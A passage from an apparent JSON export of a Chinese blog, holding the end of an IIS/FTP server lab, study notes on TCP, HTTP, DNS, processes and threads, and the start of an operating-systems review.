7.基于虚拟目录的多个站点的创建\n\ni.\t在C盘下创建五桂山公司网站的目录，并在目录下创建两个目录CW、RS，并在每个目录中分别创建first.html、second.html文件。\n\nii.\t打开【Internet信息服务（IIS）管理器】，找到五桂山公司网站，在右键菜单中选择【添加虚拟目录】。\niii.\t在【添加虚拟目录】对话框中，在【别名】输入CW，【物理路径】输入C:\\五桂山公司网站\\CW，单击【确定】按钮。\n\niv.\t使用同样的方法，配置虚拟目录的网站，物理路径：C:\\五桂山公司网站\\RS。\n\nv.\t在客户端浏览器地址栏分别输入域名虚拟目录：www.wgs.com/CW、www.wgs.com/RS，都可以正常访问。\n\n### 8.通过FTP更新Web站点\n\ni.\t打开【Internet信息服务（IIS）管理器】，找到【网络编辑部】网站，在右键菜单中单击【添加FTP发布】按钮。\nii.\t打开【绑定和SSL设置】窗口，在【IP地址】输入10.6.64.8，在【SSL】选择无SSL,单击【下一步】按钮。\n\niii.\t在【身份验证和授权信息】中，选中【匿名】、【读取】、【写入】复选框，在【允许访问】选择【所有用户】，单击【完成】按钮。\n\niv.\t在客户端使用FTP客户端更新前访问网络编辑部的网站【http://web.wgs.com】。\n\nv.\t在客户端上用FTP客户端软件（FlashFXP）登录FTP服务器，此时，可以进行上传和删除网站文件，实现了网站的更新。\n\nvi.\t在客户端使用FTP客户端更新后访问网络编辑部的网站【http://web.wgs.com】。 ","tags":["Windows服务器配置与管理","Web服务器"],"categories":["Course"]},{"title":"计网 & OS","url":"/posts/31060.html","content":"\n# 计网\n\n## ①网络分层\n\n![](https://img.jwt1399.top/img/202211141240937.png)\n\n## ②TCP\n\n### ❶三次握手\n\n![](https://img.jwt1399.top/img/202210271335204.png)\n\n1.  **第一次握手：**客户端向服务端发起建立连接请求，客户端会随机生成一个起始序列号x，客户端向服务端发送数据包（包含标志位`SYN=1`，序列号`seq=x`）。\n    - 第一次握手前客户端的状态为`CLOSE`，第一次握手后客户端的状态为`SYN-SEND`。此时服务端的状态为`LISTEN`。\n2.  **第二次握手：**服务端在收到客户端发来的报文后，会随机生成一个服务端的起始序列号y，然后给客户端回复一段报文（包括标志位`SYN=1`，`ACK=1`，序列号`seq=y`，确认号`ack=x+1`）。（其中`SYN=1`表示要和客户端建立一个连接，`ACK=1`表示确认序号有效）\n    - 第二次握手前服务端的状态为`LISTEN`，第二次握手后服务端的状态为`SYN-RCVD`，此时客户端的状态为`SYN-SENT`。\n3.  **第三次握手：**客户端收到服务端发来的报文后，会再向服务端发送报文（包含标志位`ACK=1`，序列号`seq=x+1`，确认号`ack=y+1`）。\n    - 第三次握手前客户端的状态为`SYN-SENT`，第三次握手后客户端和服务端的状态都为`ESTABLISHED`。**此时连接建立完成，客户端和服务端就可以传输数据啦。**\n\n参考：[程序员大彬 (topjavaer.cn)](http://topjavaer.cn/computer-basic/network.html#三次握手)\n\n### ❷为什么要三次握手?\n\n> 两次握手可以吗？\n\n三次握手的目的是建立可靠的通信信道，即双方确认自己与对方的发送与接收是否正常。\n\n|                |                 Client                 |                 Server                 |\n| -------------- | :------------------------------------: | :------------------------------------: |\n| **第一次握手** |             什么都不能确认             |       对方发送正常，自己接收正常       |\n| **第二次握手** | 自己发送、接收正常；对方发送、接收正常 |       对方发送正常，自己接收正常       |\n| **第三次握手** | 自己发送、接收正常；对方发送、接收正常 | 自己发送、接收正常，对方发送、接收正常 |\n\n两次握手的话服务端无法确认自己发送和对方接收是否正常，三次握手就能确认双发收发功能都正常，缺一不可。\n\n即第三次握手**防止了已失效的连接请求报文段**突然又传输到了服务端。\n\n### ❸四次挥手\n\n![](https://img.jwt1399.top/img/202211141240210.png)\n\n1.  **第一次挥手：**客户端向服务端连接释放报文段（`FIN=1，seq=u`），进入`FIN-WAIT-1`（终止等待1）状态。\n2.  **第二次挥手：**服务端收到连接释放报文段后发出确认报文段（`ACK=1，ack=u+1，seq=v`），服务端进入`CLOSE-WAIT`（关闭等待）状态，客户端进入`FIN-WAIT-2`（终止等待2）状态，此时的TCP处于半关闭状态，客户端到服务端的连接释放。\n3.  **第三次挥手：**服务端发送完数据，就会发出连接释放报文段（`FIN=1，ACK=1，seq=w，ack=u+1`），服务端进入`LAST-ACK`（最后确认）状态，等待客户端的确认。\n4.  **第四次挥手：**客户端收到服务端的连接释放报文段后，发出确认报文段（`ACK=1，seq=u+1，ack=w+1`），客户端进入`TIME-WAIT`（时间等待）状态。服务端收到客户端发出的确认报文段后关闭连接，进入`CLOSED`状态。如果客户端等待 `2MSL`（最大报文段生存时间） 后依然没有收到回复，就证明服务端已正常关闭，客户端才进入`CLOSED`状态。\n\n### ❹TCP 与 UDP 的区别\n\n-   **是否面向连接** ：\n    -   UDP是无连接的，在传送数据之前不需要先建立连接。\n    -   TCP 面向连接，在传送数据之前必须先建立连接，数据传送结束后要释放连接。\n-   **是否是可靠传输**：\n    -   主机收到 UDP 报文后，不需要给出任何确认，并且不保证数据不丢失，不保证是否顺序到达。\n    -   TCP 提供可靠的传输服务，TCP 在传递数据之前，会有三次握手来建立连接，而且在数据传递时，有确认、窗口、重传、拥塞控制机制。通过 TCP 连接传输的数据，无差错、不丢失、不重复、并且按序到达。\n-   **传输效率** ：由于 TCP 进行传输的时候多了连接、确认、重传等机制，所以 TCP 的传输效率要比 UDP 低很多。\n-   **传输形式** ： TCP 是面向字节流的，UDP 是面向报文的。\n-   **首部开销** ：TCP 首部开销（20 ～ 60 字节）比 UDP 首部开销（8 字节）要大。\n-   **是否提供广播或多播服务** ：TCP 只支持点对点通信，UDP 支持一对一、一对多、多对一、多对多；\n\n| TCP          | UDP            |            |\n| ------------ | -------------- | ---------- |\n| 是否面向连接 | 是             | 否         |\n| 是否可靠     | 是             | 否         |\n| 是否有状态   | 是             | 否         |\n| 传输效率     | 较慢           | 较快       |\n| 传输形式     | 字节流         | 数据报文段 |\n| 首部开销     | 20 ～ 60 bytes | 8 bytes    |\n| 广播或多播   | 否             | 是         |\n\n### ❺使用 TCP 的协议有哪些?\n\n基于TCP的应用层协议有：HTTP、 FTP、 SMTP、POP3/IMAP、 TELNET、SSH\n\n| 协议      | 名称             | 默认端口 | 功能                                           |\n| --------- | ---------------- | -------- | ---------------------------------------------- |\n| HTTP      | 超文本传输协议   | 80       | Web 浏览器与 Web 服务器通信                    |\n| FTP       | 文件传输协议     | 20、21   | 提供文件传输服务                               |\n| SMTP      | 简单邮件传输协议 | 25       | 用来发送电子邮件                               |\n| POP3/IMAP | 邮件接收协议     | 110/143  | 负责邮件接收的协议                             |\n| TELNET    | 远程登陆协议     | 23       | 远程登录会话，被SSH取代                        |\n| SSH       | 安全外壳协议     | 22       | 专为远程登录会话和其他网络服务提供安全性的协议 |\n\n### ❻使用 UDP 的协议有哪些?\n\n基于UDP的应用层协议：DHCP、DNS\n\n- DHCP：动态主机配置协议，用来动态配置 IP 地址，默认端口68\n- DNS：域名解析协议，将域名转换为 IP 地址，默认端口53\n\n### ❼TCP 如何保证传输的可靠性？\n\n- 首先，TCP的连接是基于**三次握手**，而断开则是基于**四次挥手**。确保连接和断开的可靠性。\n- 其次，还体现在**有状态**；TCP会记录哪些数据发送了，哪些数据被接收了，哪些没有被接受，并且保证数据包按序到达，保证数据传输不出差错。\n- 再次，还体现在**可控制**。它有**数据包校验、ACK应答、超时重传(发送方)、失序数据重传（接收方）、丢弃重复数据、流量控制（滑动窗口）和拥塞控制等机制**。\n\n**流量控制** : 当接收方来不及处理发送方的数据，能提示发送方降低发送的速率，防止包丢失。TCP 使用的流量控制协议是可变大小的滑动窗口协议（TCP 利用滑动窗口实现流量控制）。\n\n**拥塞控制** : 当网络拥塞时，减少数据的发送。\n\n拥塞控制是一个全局性的过程，涉及到所有的主机，所有的路由器，以及与降低网络传输性能有关的所有因素。\n\n流量控制往往是点对点通信量的控制，是个端到端的问题。抑制发送端发送数据的速率，以便接收端来得及接收。\n\n### ❽TCP 如何实现流量控制？\n\n**TCP 利用滑动窗口实现流量控制。流量控制是为了控制发送方发送速率，保证接收方来得及接收。** 接收方发送的确认报文中的窗口字段可以用来控制发送方窗口大小，从而影响发送方的发送速率。将窗口字段设置为 0，则发送方不能发送数据。\n\n### ❾TCP 的拥塞控制是怎么实现的？\n\n拥塞：在某段时间，若对网络中某一资源的需求超过了该资源所能提供的可用部分，网络的性能就要变坏。\n\n为了进行拥塞控制，TCP 发送方要维持一个 **拥塞窗口(cwnd)** 的状态变量。拥塞控制窗口的大小取决于网络的拥塞程度，并且动态变化。发送方让自己的发送窗口取为拥塞窗口和接收方的接受窗口中较小的一个。\n\nTCP 的拥塞控制采用了四种算法，即 **慢开始** 、 **拥塞避免** 、**快重传** 和 **快恢复**。在网络层也可以使路由器采用适当的分组丢弃策略（如主动队列管理 AQM），以减少网络拥塞的发生。\n\n- **慢开始：** 慢开始算法的思路是当主机开始发送数据时，如果立即把大量数据字节注入到网络，那么可能会引起网络阻塞，因为现在还不知道网络的符合情况。经验表明，较好的方法是先探测一下，即由小到大逐渐增大发送窗口，也就是由小到大逐渐增大拥塞窗口数值。cwnd 初始值为 1，每经过一个传播轮次，cwnd 加倍。\n- **拥塞避免：** 拥塞避免算法的思路是让拥塞窗口 cwnd 缓慢增大，即每经过一个往返时间 RTT 就把发送放的 cwnd 加 1.\n- **快重传：**有时个别报文段会在网络中丢失，但实际上网络并未发生拥塞。如果发送方迟迟收不到确认，就会产生超时，就会误认为网络发生了拥塞。这就导致发送方错误地启动慢开始，把拥塞窗口cwnd又设置为1，因而\n  降低了传输效率。快重传算法可以避免这个问题。快重传算法首先要求接收方每收到一个失序的报文段后就立即发出重复确认，使发送方及早知道有报文段没有到达对方。发送方只要一连收到三个重复确认就应当立即重传对方尚未收到的报文段，而不必继续等待重传计时器到期。由于发送方尽早重传未被确认的报文段，因此采用快重传后可以使整个网络吞吐量提高约20%。\n- **快恢复：** 当发送方连续收到三个重复确认，就会把慢开始门限ssthresh减半，接着把cwnd值设置为慢开始门限\n  ssthresh减半后的数值，然后开始执行拥塞避免算法，使拥塞窗口缓慢地线性增大。在采用快恢复算法时，慢开始算法只是在TCP连接建立时和网络出现超时时才使用。采用这样的拥塞控制方法使得TCP的性能有明显的改进。\n\n## ③HTTP\n\n### ❶从输入URL 到页面展示的过程\n\n1. **DNS 解析**\n\n因为浏览器不能直接通过域名找到对应的服务器 IP 地址，所以需进行 DNS 解析，查找到对应的 IP 地址进行访问。\n\n2. **TCP 连接**\n\n当浏览器获取到服务器的 IP 地址后，浏览器会用一个随机的端口（1024 < 端口 < 65535）向服务器 80 端口发起 TCP 连接请求（注：HTTP 默认约定 80 端口，HTTPS 为 443 端口）。这个连接请求到达服务端后，通过 TCP 三次握手，建立 TCP 的连接。\n\n3. **发送 HTTP / HTTPS 请求（建立 TLS 连接）**\n\n建立连接后就可以通过 HTTP 进行数据传输。如果使用 HTTPS，会在 TCP 与 HTTP 之间多添加一层协议做加密及认证的服务。HTTPS 使用 SSL（Secure Socket Layer） 和 TLS（Transport Layer Security） 协议，保障了信息的安全。\n\n4. **服务器处理请求并返回 HTTP 报文**\n\n服务器收到请求后，将发回一个 HTTP 响应报文，内容包括相关响应头和 HTML 正文。\n\n5. **浏览器解析渲染页面**\n\n浏览器在收到HTML,CSS,JS文件后，渲染页面呈现到屏幕上\n\n6. **HTTP 请求结束，断开 TCP 连接**\n\n现在的页面为了优化请求的耗时，默认都会开启持久连接（keep-alive），那么一个 TCP 连接确切关闭的时机，是这个 tab 标签页关闭的时候。这个关闭的过程就是**四次挥手**。\n\n参考：[浏览器从输入网址到页面展示的过程](https://cloud.tencent.com/developer/article/1879758)\n\n### ❷SSL/TLS\n\nSSL/TLS是一种密码通信框架，他是世界上使用最广泛的密码通信方法。SSL/TLS综合运用了密码学中的对称密码，消息认证码，公钥密码，数字签名，伪随机数生成器等。\n\nSSL(Secure Socket Layer)安全套接层，是1994年由Netscape公司设计的一套协议，并与1995年发布了3.0版本。\n\nTLS(Transport Layer Security)传输层安全是IETF在SSL3.0基础上设计的协议，相当于SSL的后续版本。\n\n![](https://img.jwt1399.top/img/202210271131168.webp)\n\nTLS主要分为两层，\n\n- 底层是**TLS记录协议**，负责消息的压缩，加密及认证\n\n- 上层是**TLS握手协议**，主要分为握手协议，密码规格变更协议和应用数据协议4个部分。\n\n  - 1.**握手协议：**负责在客户端和服务器端商定密码算法和共享密钥，包括证书认证\n\n  - 2.**密码规格变更协议：**负责向通信对象传达变更密码方式的信号\n\n  - 3.**警告协议：**负责在发生错误的时候将错误传达给对方\n\n  - 4.**应用数据协议：**负责将TLS承载的应用数据传达给通信对象的协议。\n\n### ❸HTTP 和 HTTPS 有什么区别\n\n- **端口号** ：HTTP 默认是 80，HTTPS 默认是 443。\n- **URL 前缀** ：HTTP 的 URL 前缀是 `http://`，HTTPS 的 URL 前缀是 `https://`。\n- **安全性和资源消耗** ：HTTP 安全性没有 HTTPS 高，但 HTTPS 比 HTTP 耗费更多服务器资源且响应速度更慢。 \n  - **HTTP 协议运行在 TCP 之上**，所有传输的内容都是明文。客户端和服务器端都无法验证对方的身份。\n  - **HTTP 协议运行在 SSL 之上**，SSL/TLS 运行在 TCP 之上，HTTPS = (SSL/TLS + HTTP)，SSL/TLS依靠证书来验证服务器的身份，并为浏览器和服务器之间的通信加密。加密采用对称加密，但对称加密的密钥用服务器方的证书进行非对称加密。\n  - HTTP 使用 TCP 三次握手建立连接，客户端和服务器需要交换 3 个包。\n  - HTTPS除了 TCP 的三个包，还要加上 SSL 握手需要的 9 个包，所以一共是 12 个包。\n\n### ➍HTTP 1.0 、1.1、 2.0、3.0区别\n\n#### ⓵HTTP 1.0——1996\n\n> 1.0的HTTP版本，是一种无状态，无连接的应用层协议。\n\n`特点：`\n\n- **短连接：**HTTP1.0规定浏览器和服务器保持短暂的链接\n\n- **无连接：**浏览器每次请求都需要与服务器建立一个TCP连接，服务器处理完成以后立即断开TCP连接\n- **无状态：**服务器不跟踪每个客户，也不记录过去的请求，借助**cookie/session**机制来做身份认证和状态记录。\n  \n- **无法复用连接**：每次发送请求，都需要进行一次TCP连接，而TCP的连接释放过程又是比较费事的。这种无连接的特性会使得网络的利用率变低。\n\n- **队头阻塞**：HTTP1.0规定下一个请求必须在前一个请求响应到达之后才能发送，假设前一个请求响应一直不到达，那么下一个请求就不发送，后面的请求就阻塞了。\n\n- **不支持断点续传**：也就是说，每次都会传送全部的页面和数据。\n\n#### ⓶HTTP 1.1——1999\n\n> HTTP1.1继承了HTTP1.0，克服了HTTP1.0性能上的问题。\n\n- **长连接**：HTTP1.1增加`Connection`字段，通过设置`Keep-Alive`保持HTTP连接不断。避免每次客户端与服务器请求都要重复建立释放建立TCP连接。提高了网络的利用率。如果客户端想关闭HTTP连接，可以在请求头中携带`Connection:false`来告知服务器关闭请求。\n- **支持断点续传**：通过使用请求头中的 `Range` 来实现。它允许只请求资源的某个部分，即返回码是 206（Partial Content），这样就方便了开发者自由的选择以便于充分利用带宽和连接。\n\n- **增加Host字段** : HTTP/1.1在请求头中加入了`Host`字段。没有Host头域会报告一个错误（400 Bad Request）\n- **缓存处理** : 在 HTTP1.0 中主要使用 `Header` 里的` If-Modified-Since,Expires` 来做为缓存判断的标准，HTTP1.1 则引入了更多的缓存控制策略例如 `Entity tag，If-Unmodified-Since, If-Match, If-None-Match` 等更多可供选择的缓存头来控制缓存策略。\n- **可以使用管道传输**：多个请求可以同时发送，但是服务器还是按照顺序，先回应 A 请求，完成后再回应 B 请求。要是 前面的回应特别慢，后面就会有许多请求排队等着。这称为「队头堵塞」。\n- **状态响应码** : HTTP/1.1中新加入了大量的状态码，光是错误响应状态码就新增了24种。例如：\n  - `100 (Continue)`——在请求大资源前的预热请求，\n  - `206 (Partial Content)`——范围请求的标识码，\n  - `409 (Conflict)`——请求与当前资源的规定冲突，\n  - `410 (Gone)`——资源已被永久转移，而且没有任何已知的转发地址。\n\n#### ⓷HTTP 2.0——2015\n\n> http2.0是一种安全高效的下一代http传输协议。安全是因为http2.0建立在https协议的基础上，高效是因为它是通过二进制分帧来进行数据传输。正因为这些特性，http2.0协议也在被越来越多的网站支持。\n\n- **二进制分帧：**HTTP2.0通过在应用层和传输层之间增加一个二进制分层帧，突破了HTTP1.1的性能限制，改进传输性能。\n\n- **多路复用**：使用多个stream，每个stream又分帧传输，使得一个tcp连接能够处理多个http请求\n\n- **头部压缩**：通讯双方各自维护一个header的索引表，使得不需要直接发送值，通过发送key缩减头部大小\n\n- **服务器推送**：服务器除了最初请求的响应外，服务器还可额外向客户端推送资源，而无需客户端明确的需求\n\n参考：[深入理解http2.0协议，看这篇就够了！](https://mp.weixin.qq.com/s/a83_NE-ww36FZsy320MQFQ)\n\n#### ⓸HTTP 3.0——2022\n\n> 基于Google的QUIC，HTTP3 背后的主要思想是放弃 TCP，转而使用基于 UDP 的 QUIC 协议。\n>\n> **为什么要有HTTP3.0？**\n>\n> 为了解决HTTP/2.0中TCP造成的队头阻塞问题，HTTP/3.0直接放弃使用TCP，将传输层协议改成UDP；但是因为UDP是不可靠传输，所以这就需要QUIC实现可靠机制\n\n- **使用基于UDP的QUIC 协议**：减少了tcp三次握手时间，以及tls握手时间；\n\n- **解决多路复用丢包的队头阻塞问题**：解决了http 2.0中前一个stream丢包导致后一个stream被阻塞的问题；\n\n- **优化了重传策略**，重传包和原包的编号不同，降低后续重传计算的消耗；\n\n- **连接迁移**，不再用tcp四元组确定一个连接，而是用一个64位随机数来确定这个连接；\n\n- **更合适的流量控制**：通过流量控制可以限制客户端传输资料量的大小，有了流量控制后，接收端就可以只保留相对应大小的接收 buffer ,优化记忆体被占用的空间。\n\n参考：[HTTP/3 ，它来了](https://mp.weixin.qq.com/s?__biz=MzI0ODk2NDIyMQ==&mid=2247497865&idx=1&sn=2d1f8a1dfcfb9ccde4f29adbfef8dad2&chksm=e99a0d9bdeed848dfb7ee092a2bb685f02d277584a31c1d6300213306b1561e71888438a201f&token=2007326582&lang=zh_CN#rd)\n\n### ➎HTTP 常见状态码总结\n\nHTTP 状态码由三个十进制数字组成，第一个十进制数字定义了状态码的类型。响应分为五类：\n\n| 分类 | 分类描述                                         |\n| :--: | :----------------------------------------------- |\n| 1**  | 信息响应，服务器收到请求，需要请求者继续执行操作 |\n| 2**  | 成功响应，操作被成功接收并处理                   |\n| 3**  | 重定向，需要进一步的操作以完成请求               |\n| 4**  | 客户端错误，请求包含语法错误或无法完成请求       |\n| 5**  | 服务器错误，服务器在处理请求的过程中发生了错误   |\n\n- 程序员最想看到的：200-OK。\n\n- 程序员不想看到的：500-Internal-Server-Error。\n\n- 用户不想看到的：401-Unauthorized、403-Forbidden、408-Request-Time-out。\n\n参考：[HTTP 状态码 | 菜鸟教程 (runoob.com)](https://www.runoob.com/http/http-status-codes.html)\n\n### ❻HTTP 中 GET 和 POST 区别\n\n- 1.GET请求参数通过URL传递；POST请求参数通过请求体传递。\n- 2.GET请求产生1个TCP数据包；POST请求产生2个TCP数据包。\n  - 对于GET请求，浏览器会把请求头和请求体一并发送出去\n  - 对于POST请求，浏览器先发送请求头，服务器响应100 continue，浏览器再发送请求体\n- 3.GET请求会被浏览器主动缓存；POST请求不会，需手动设置。\n- 4.GET请求参数会被保留在浏览器历史记录中；POST请求参数不会被保留。\n\n### ❼URI 和 URL 的区别\n\n- URI（Uniform Resource Identifier）统一资源标识符，唯一标识一个资源\n  - URI 像是身份证，唯一标识一个人\n- URL（Uniform Resource Locator）统一资源定位符，提供该资源多路径，是一种具体的URI。\n  - URL像是住址，可以通过URL找到这个人\n\n### ❽cookie和session的区别？\n\n[Cookie & Session | 简言之 (jwt1399.top)](https://jwt1399.top/posts/37985.html#toc-heading-9)\n\n- Cookie 是一种**服务端产生**但**存储在客户端**用于记录客户端状态的机制。\n\n- Session 是一种**存储在服务器端**用于记录客户端状态的机制。\n\n- Cookie 机制是通过**检查客户身上的“通行证”**来确认客户身份\n- Session 机制是通过**检查服务器上的“客户明细表”**来确认客户身份\n\n|   区别   |    Cookie    |  Session   |\n| :------: | :----------: | :--------: |\n| 存储位置 |    客户端    |   服务端   |\n| 存储大小 | 有限制（4k） |   无限制   |\n| 跨域支持 |     支持     |   不支持   |\n| 存储信息 |    不加密    |    加密    |\n| 生命周期 |   可自定义   | 不可自定义 |\n\n### ❾HTTP 如何保存用户状态?\n\nHTTP 是一种无状态（stateless）协议。HTTP 协议自身不对请求和响应之间的通信状态进行保存。\n\nSession 机制的存在就是为了解决这个问题，Session 的主要作用就是通过服务端记录用户的状态。服务端给特定的用户创建特定的 Session 之后就可以标识这个用户并且跟踪这个用户了（一般情况下，服务器会在一定时间内保存这个 Session，过了时间限制，就会销毁这个 Session）。在服务端保存 Session 的方法很多，最常用的就是内存和数据库(比如是使用内存数据库 redis 保存)。\n\n**既然 Session 存放在服务器端，那么我们如何实现 Session 跟踪呢？**大部分情况下，我们都是通过在 Cookie 中附加一个 Session ID 来方式来跟踪。\n\n**Cookie 被禁用怎么办?**最常用的就是利用 URL 重写把 Session ID 直接附加在 URL 路径的后面。\n\n## ④Other\n\n### ❶DNS 的解析过程\n\n1. 浏览器搜索**自己的DNS缓存**\n2. 若没有，则搜索**操作系统中的DNS缓存**和**hosts文件**\n\n3. 若没有，则操作系统将域名发送至**本地域名服务器**，查找成功则返回结果，否则依次向**根域名服务器**、**顶级域名服务器**、**权限域名服务器**发起查询请求，最终返回IP地址给本地域名服务器\n4. **本地域名服务器**将得到的IP地址**缓存起来**并返回给**操作系统**\n5. **操作系统**将 IP 地址**缓存起来**并**返回给浏览器**\n6. 浏览器得到域名对应的IP地址\n\n###  ❷ARP 协议\n\n**地址解析协议（Address Resolution Protocol）**，它解决的是网络层地址和链路层地址之间的转换问题。因为一个 IP 数据报在物理上传输的过程中，总是需要知道下一跳（物理上的下一个目的地）该去往何处，但 IP 地址属于逻辑地址，而 MAC 地址才是物理地址，ARP 协议解决了 IP 地址转 MAC 地址的一些问题。\n\n# OS\n\n## ①进程和线程\n\n### ❶进程和线程的区别\n\n- 进程是指一个内存中运行的应用程序，每个进程都有自己独立的一块内存空间。\n- 线程是比进程更小的执行单位，一个进程可以启动多个线程，每条线程并行执行不同的任务。\n\n- 调度：进程是资源管理的基本单位，线程是程序执行的基本单位。\n\n- 切换：线程上下文切换比进程上下文切换要快得多。\n\n- 拥有资源：进程是拥有资源的一个独立单位，线程不拥有系统资源，但是可访问隶属于进程的资源。\n\n- 系统开销：创建或撤销进程时，系统都要为之分配或回收系统资源，创建或撤销进程的开销大于创建或撤销线程时的开销，进程切换的开销也远大于线程切换的开销。\n\n### ❷进程间的通信方式\n\n1. **管道/匿名管道(Pipes)** ：用于具有亲缘关系的父子进程间或者兄弟进程之间的通信。\n2. **有名管道(Named Pipes)** : 匿名管道由于没有名字，只能用于亲缘关系的进程间通信。为了克服这个缺点，提出了有名管道。有名管道严格遵循**先进先出(first in first out)**。有名管道以磁盘文件的方式存在，可以实现本机任意两个进程通信。\n3. **信号(Signal)** ：信号是一种比较复杂的通信方式，用于通知接收进程某个事件已经发生；\n4. **消息队列(Message Queuing)** ：消息队列是消息的链表，具有特定的格式，存放在内存中并由消息队列标识符标识。管道和消息队列的通信数据都是先进先出的原则。与管道（无名管道：只存在于内存中的文件；命名管道：存在于实际的磁盘介质或者文件系统）不同的是消息队列存放在内核中，只有在内核重启(即，操作系统重启)或者显式地删除一个消息队列时，该消息队列才会被真正的删除。消息队列可以实现消息的随机查询，消息不一定要以先进先出的次序读取，也可以按消息的类型读取。比 FIFO 更有优势。**消息队列克服了信号承载信息量少，管道只能承载无格式字节流以及缓冲区大小受限等缺点。**\n5. **信号量(Semaphores)** ：信号量是一个计数器，用于多进程对共享数据的访问，信号量的意图在于进程间同步。这种通信方式主要用于解决与同步相关的问题并避免竞争条件。\n6. **共享内存(Shared memory)** ：使得多个进程可以访问同一块内存空间，不同进程可以及时看到对方进程中对共享内存中数据的更新。这种方式需要依靠某种同步操作，如互斥锁和信号量等。可以说这是最有用的进程间通信方式。\n7. **套接字(Sockets)** : 此方法主要用于在客户端和服务器之间通过网络进行通信。套接字是支持 TCP/IP 的网络通信的基本操作单元，可以看做是不同主机之间的进程进行双向通信的端点，简单的说就是通信的两方的一种约定，用套接字中的相关函数来完成通信过程。\n\n### ❸进程有哪几种状态\n\n- **创建状态(new)** ：进程正在被创建，尚未到就绪状态。\n\n- **就绪状态(ready)** ：进程已处于准备运行状态，即进程获得了除了处理器之外的一切所需资源，一旦得到处理器资源(处理器分配的时间片)即可运行。\n\n- **运行状态(running)** ：进程正在处理器上运行(单核 CPU 下任意时刻只有一个进程处于运行状态)。\n\n- **阻塞状态(waiting)** ：又称为等待状态，进程正在等待某一事件而暂停运行如等待某资源为可用或等待 IO 操作完成。即使处理器空闲，该进程也不能运行。\n\n- **结束状态(terminated)** ：进程正在从系统中消失。可能是进程正常结束或其他原因中断退出运行。\n\n![](https://img.jwt1399.top/img/202211251026928.png)\n\n\n\n### ❹进程的调度算法\n\n- 先来先服务（FCFS）\n  - 从就绪队列中选择一个最先进入该队列的进程为之分配资源，使它立即执行并一直执行到完成或发生某事件而被阻塞放弃占用 CPU 时再重新调度。\n- 短作业优先（SJF）\n  - 从就绪队列中选出一个估计运行时间最短的进程为之分配资源，使它立即执行并一直执行到完成或发生某事件而被阻塞放弃占用 CPU 时再重新调度。\n- 优先级调度算法（PSA）\n  - 为每个流程分配优先级，首先执行具有最高优先级的进程，依此类推。具有相同优先级的进程以 FCFS 方式执行。可以根据内存要求，时间要求或任何其他资源要求来确定优先级。\n- 高响应比优先调度算法（HRRN）\n  - 根据“响应比 =（进程执行时间+进程等待时间）/ 进程执行时间”这个公式得到的响应比来进行调度。\n  - 优点是兼顾长短作业，缺点是计算响应比开销大，适用于批处理系统。\n  - **FCFS方式只考虑每个作业的等待时间而未考虑执行时间的长短；**\n  - **SJF方式只考虑执行时间而未考虑等待时间的长短**。\n\n- 时间片轮转调度算法 （RR）\n  - 每个进程被分配一个时间段，称作它的时间片，即该进程允许运行的时间。\n\n### ❺线程有多少种状态\n\n1. **New（新建**）：尚未启动的线程处于此状态。\n2. **Runnable（运行）**：在Java虛拟机中执行的线程处于此状态。\n3. **Blocked（阻塞）**：被阻塞等待监视器锁定的线程处于此状态。\n4. **Waiting（等待）**：正在等待另一个线程执行特定动作的线程处于此状态。\n5. **Timed Waiting（计时等待）**：正在等待另一个线程执行动作达到指定等待时间的线程处于此状态。\n6. **Terminated（终止）**：已退出的线程处于此状态。\n\n![](https://img.jwt1399.top/img/202211261112909.png)\n\n### ❻并发&并行\n\n**并发**：同一个时刻，多个任务**交替执行**。单核 cpu 实现的多任务就是并发。例如：Tom 边开车边接电话\n\n**并行**：同一个时刻，多个任务**同时执行**。多核 cpu 可以实现并行。例如：Tom 开车 ，Jack 接电话\n\n### ❼线程间的同步的方式\n\n1. **互斥量(Mutex)**：采用互斥对象机制，只有拥有互斥对象的线程才有访问公共资源的权限。比如 Java 中的 synchronized 关键词和各种 Lock 都是这种机制。\n2. **信号量(Semaphore)** ：它允许同一时刻多个线程访问同一资源，但是需要控制同一时刻访问此资源的最大线程数量。\n3. **事件(Event)** :Wait/Notify：通过通知操作的方式来保持多线程同步，方便的实现多线程优先级的比较操作。\n\n### ❽死锁的四个必要条件\n\n\n\n# Sponsor❤️\n\n您的支持是我不断前进的动力，如果您感觉本文对您有所帮助的话，可以考虑打赏一下本文，用以维持本博客的运营费用，拒绝白嫖，从你我做起！🥰🥰🥰\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝</td>\n         <td style=\"text-align:center;\">微信</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["计网"],"categories":["CS基础"]},{"title":"操作系统复习","url":"/posts/55434.html","content":"## 第一章 概述\n\n**1、操作系统的概念、基本类型、基本特征及基本功能**\n\n概念：OS 是核心系统软件，负责计算机系统、硬件资源的分配和使用；控制和协调并发活动；提供用户接口，使用户获得良好的工作环境\n\n基本类型：\n\n1.\t批量操作系统：将用户提交的作业成批的送入计算机，然后由作业调度程序自动选择作业运行\n2.\t分时操作系统：采用时间片轮转的办法，使一台计算机同时为多个终端用户服务\n3.\t实时操作系统：对外部输入的信息，能在规定的时间内处理完毕并做出反应\n4.\t个人计算机操作系统：\n5.\t网络操作系统\n6.\t分布式操作系统：服务分布化\n\n基本特征：并发、共享、虚拟、异步\n\n- 并发：两或多个事件在同一时间间隔内发生\n- 共享：指系统中资源可供内存中多个并发执行的进程共同使用\n- 虚拟：通过某种技术把一个物理实体变为若干个逻辑上的对应物\n- 异步（不确定性）：运行进度不可预知\n\n基本功能：处理机管理、存储器管理、设备管理、文件系统管理。还有为用户使用操作系统提供了用户接口\n\n**2、操作系统的结构设计方法**\n\n## 第二章 进程管理\n\n**1、多道程序设计技术**\n\n多道程序设计技术是在计算机内存中同时存放几道相互独立的程序，使它们在管理程序控制下，相互穿插运行\n\n**2、进程的概念、特征、基本状态及与程序的区别和联系**\n\n概念：进程是指一个具有一定独立功能的程序关于某个数据集合的一次执行活动\n特征：动态性，并发性，独立性，异步性\n基本状态：就绪状态、运行状态、等待状态\n就绪（进程调度）→运行（服务请求I/O）→等待状态（服务完成/ 事件来到）→就绪状态\n\n![](https://img.jwt1399.top//img/20201220161055.png)\n\n![](https://img.jwt1399.top//img/20201220161116.png)\n\n![](https://img.jwt1399.top//img/20201220161126.png)\n\n\n\n**3、PCB 